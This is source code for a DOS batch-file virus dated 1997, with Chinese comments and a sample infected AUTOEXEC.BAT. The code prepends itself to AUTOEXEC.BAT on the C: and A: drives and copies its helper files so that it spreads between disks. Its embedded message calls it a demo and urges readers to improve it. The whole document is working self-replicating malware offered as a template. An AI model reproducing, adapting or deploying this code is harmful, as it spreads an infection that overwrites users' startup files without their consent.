 FILENAME:$$XXTEMP;主要的 BAT FILE,雖然副檔名不是 BAT
 @ECHO OFF
 ECHO @ECHO OFF >temp.bat　
 ECHO GOTO virustart >>temp.bat
 ECHO :oldentry >>temp.bat
 ECHO. >>temp.bat
 IF %1==1 GOTO infectCdrive
 IF %1==2 GOTO infectAdrive
 :go_on_infecting
 ECHO. >>temp.bat
 ECHO GOTO xxxx$$$$END >>temp.bat
 ECHO :virustart >>temp.bat
 ECHO ECHO This is DEMO of BAT's virus,it will show how to make BAT's >>temp.bat
 ECHO ECHO virus.In fact,it has many parts needed to improve,so you >>temp.bat
 ECHO ECHO can try to improve it.Trust me,you can make it! >>temp.bat
 ECHO ECHO                       Written by sofa 1997.5.12 >>temp.bat
 ECHO IF EXIST C:\AUTOEXEC.BAT GOTO case1 >>temp.bat
 ECHO :virus_go_on >>temp.bat
 ECHO IF EXIST A:\AUTOEXEC.BAT GOTO case2 >>temp.bat
 ECHO GOTO oldentry >>temp.bat
 ECHO :case1 >>temp.bat
 ECHO IF EXIST C:\$$XXTEMP GOTO virus_go_on >>temp.bat
 TYPE ~XX$$TRF >>temp.bat
 ECHO CALL $$infect.bat 1 >>temp.bat
 ECHO DEL $$infect.bat >>temp.bat
 ECHO GOTO virus_go_on >>temp.bat
 ECHO :case2 >>temp.bat
 ECHO IF EXIST A:\$$XXTEMP GOTO oldentry >>temp.bat
 TYPE ~XX$$TRF >>temp.bat
 ECHO CALL $$infect.bat 2 >>temp.bat
 ECHO DEL $$infect.bat >>temp.bat
 ECHO GOTO oldentry >>temp.bat
 ECHO :xxxx$$$$END >>temp.bat
 IF %1==1 GOTO endcase1
 IF %1==2 GOTO endcase2
 :all_activities_end
 DEL temp.bat
 GOTO end_infecting
 :infectCdrive
 TYPE C:\AUTOEXEC.BAT >>temp.bat
 GOTO go_on_infecting
 :infectAdrive
 TYPE A:\AUTOEXEC.BAT >>temp.bat
 GOTO go_on_infecting
 :endcase1
 DEL C:\AUTOEXEC.BAT
 COPY temp.bat C:\AUTOEXEC.BAT >NUL
 COPY $$XXTEMP C:\$$XXTEMP >NUL
 COPY ~XX$$TRF C:\~XX$$TRF >NUL
 GOTO all_activities_end
 :endcase2
 DEL A:\AUTOEXEC.BAT
 COPY temp.bat A:\AUTOEXEC.BAT >NUL
 COPY $$XXTEMP A:\$$XXTEMP >NUL
 COPY ~XX$$TRF A:\~XX$$TRF >NUL
 GOTO all_activities_end
 :end_infecting

 FILENAME:~XX$$TRF ;配合 TYPE 使用,這是因為我要輸出轉向符號的緣故
 COPY $$XXTEMP $$infect.bat >NUL

 FILENAME:AUTOEXEC.BAT ;這是被感染後的樣本,它的原來內容為:
 @ECHO OFF                                     @ECHO OFF
 GOTO virustart                                TIME
 :oldentry                                     DATE
                                               VER
 @ECHO OFF
 TIME
 DATE
 VER
 GOTO xxxx$$$$END
 :virustart
 ECHO This is DEMO of BAT's virus,it will show how to make BAT's
 ECHO virus.In fact,it has many parts needed to improve,so you
 ECHO can try to improve it.Trust me,you can make it!
 ECHO                       Written by sofa 1997.5.12
 IF EXIST C:\AUTOEXEC.BAT GOTO case1
 :virus_go_on
 IF EXIST A:\AUTOEXEC.BAT GOTO case2 ;因為它會檢查 A: ,所以執
 GOTO oldentry                       ;行時請於 A: 放入磁片,否
 :case1                              ;則它會停下來
 IF EXIST C:\$$XXTEMP GOTO virus_go_on
 COPY $$XXTEMP $$infect.bat >NUL
 CALL $$infect.bat 1
 DEL $$infect.bat
 GOTO virus_go_on
 :case2
 IF EXIST A:\$$XXTEMP GOTO oldentry
 COPY $$XXTEMP $$infect.bat >NUL
 CALL $$infect.bat 2
 DEL $$infect.bat
 GOTO oldentry
 :xxxx$$$$END